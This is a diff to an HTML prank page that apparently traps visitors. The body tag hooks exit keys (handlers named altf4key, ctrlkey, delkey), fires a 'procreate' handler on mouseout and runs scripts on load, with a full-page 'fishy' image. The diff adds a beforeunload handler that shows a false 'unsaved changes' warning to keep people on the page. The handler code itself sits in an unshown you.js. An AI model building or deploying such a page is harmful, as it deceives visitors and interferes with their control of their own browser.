@@ -11,6 +11,15 @@
 		
 		
 		<script src="you.js"></script>
+		<script>
+    			// Function to display the unsaved changes warning
+    			function warnBeforeUnload(event) {
+      				event.returnValue = 'You have unsaved changes. Are you sure you want to leave this page?';
+    			}
+    
+    			// Attach the warning function to the 'beforeunload' event
+   			window.addEventListener('beforeunload', warnBeforeUnload);
+  		</script>
 	</head>
 	<body bgcolor="#ffffff" onload="flagRun=1;playBall();return true;bookmark();" onkeydown="altf4key();ctrlkey();delkey();" onmouseout="procreate();" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
 		<img src="./fishy.png" alt="You Got Some Fish EH?" width = 100% height = 100%>
